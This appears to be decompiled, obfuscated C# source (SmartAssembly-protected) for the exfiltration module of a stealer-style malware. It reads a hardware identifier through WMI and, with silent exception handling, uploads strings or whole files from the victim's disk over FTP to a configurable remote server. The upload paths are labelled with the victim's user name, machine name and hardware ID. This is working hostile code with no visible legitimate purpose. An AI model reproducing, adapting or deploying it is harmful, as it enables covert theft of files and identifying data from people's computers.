using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace FEPAnxLYcpgz;

internal sealed class HKXKblcyQL
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string dfSGvmAVVORsHgb()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107477367));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107477378)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107477329);
			ManagementObject val3 = new ManagementObject(getString_0(107477324) + text + getString_0(107477315));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107477310)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107368959);
		}
	}

	public static void WLaHxpQLRFoNUD(string wXafIrCeYIucPk = "URL", string BKhLLVLbvVv = "USERNAME", string tFGmUJvDCtzk = "ACCESO", string NfxYtNwyyx = "")
	{
		try
		{
			string text = dfSGvmAVVORsHgb();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(wXafIrCeYIucPk + getString_0(107479167) + Environment.UserName + getString_0(107479122) + Environment.MachineName + getString_0(107479133) + text + getString_0(107479096));
			ftpWebRequest.Method = getString_0(107477285);
			ftpWebRequest.Credentials = new NetworkCredential(BKhLLVLbvVv, tFGmUJvDCtzk);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(NfxYtNwyyx);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void qAqkJtEobtFntux(string BWRuxOxefutKOBulEi = "URL", string LPKBrLxrUUeRT = "USERNAME", string XSDnkhUzXmDYUXR = "ACCESO", string FCkIfnKeQAQ = "")
	{
		try
		{
			string text = dfSGvmAVVORsHgb();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(BWRuxOxefutKOBulEi + getString_0(107479167) + Environment.UserName + getString_0(107479122) + Environment.MachineName + getString_0(107479133) + text + getString_0(107479133) + Path.GetFileName(FCkIfnKeQAQ));
			ftpWebRequest.Method = getString_0(107477285);
			ftpWebRequest.Credentials = new NetworkCredential(LPKBrLxrUUeRT, XSDnkhUzXmDYUXR);
			byte[] array = File.ReadAllBytes(FCkIfnKeQAQ);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static HKXKblcyQL()
	{
		Strings.CreateGetStringDelegate(typeof(HKXKblcyQL));
	}
}
